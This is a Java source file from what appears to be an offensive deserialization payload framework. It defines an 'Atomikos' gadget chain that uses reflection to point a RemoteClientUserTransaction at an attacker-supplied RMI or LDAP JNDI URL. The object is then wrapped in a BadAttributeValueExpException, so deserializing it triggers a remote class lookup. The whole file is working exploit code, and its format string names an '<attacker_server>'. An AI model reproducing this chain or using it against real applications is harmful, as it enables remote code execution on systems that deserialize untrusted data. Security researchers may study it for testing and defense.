package com.ppp.chain.others;

import com.atomikos.icatch.jta.RemoteClientUserTransaction;
import com.ppp.JavaClassHelper;
import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;

/**
 * @author Whoopsunix
 */
@Dependencies({"com.atomikos:transactions-osgi:4.0.6", "javax.transaction:jta:1.1"})
@Authors({Authors.PWNTESTER, Authors.SCICCONE})
@Sink({Sink.JNDI})
public class Atomikos implements ObjectPayload<Object> {
    public static void main(String[] args) throws Exception {
        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setSink(Atomikos.class.getAnnotation(Sink.class).value()[0]);
        sinksHelper.setEnchant(EnchantType.DEFAULT);
        sinksHelper.setCommand("rmi://127.0.0.1:1099/wtkwre");
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        javaClassHelper.setExtendsAbstractTranslet(true);
        sinksHelper.setJavaClassHelper(javaClassHelper);

        PayloadRunner.run(Atomikos.class, args, sinksHelper);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain((String) sinkObject);

        return kickOffObject;
    }

    public Object getChain(String command) throws Exception {
        // validate command
        int sep = command.lastIndexOf('/');
        if (sep < 0 || (!command.startsWith("ldap") && !command.startsWith("rmi")))
            throw new IllegalArgumentException("Command format is: " + command
                    + "(rmi,ldap)://<attacker_server>[:<attacker_port>]/<classname>");

        String url = command.substring(0, sep);
        String className = command.substring(sep + 1);

        // create factory based on url
        String initialContextFactory;
        if (url.startsWith("ldap"))
            initialContextFactory = "com.sun.jndi.ldap.LdapCtxFactory";
        else
            initialContextFactory = "com.sun.jndi.rmi.registry.RegistryContextFactory";

        // create object
        RemoteClientUserTransaction rcut = new RemoteClientUserTransaction();

        // set values using reflection
        Reflections.setFieldValue(rcut, "initialContextFactory", initialContextFactory);
        Reflections.setFieldValue(rcut, "providerUrl", url);
        Reflections.setFieldValue(rcut, "userTransactionServerLookupName", className);

        return KickOff.badAttributeValueExpException(rcut);
    }

}
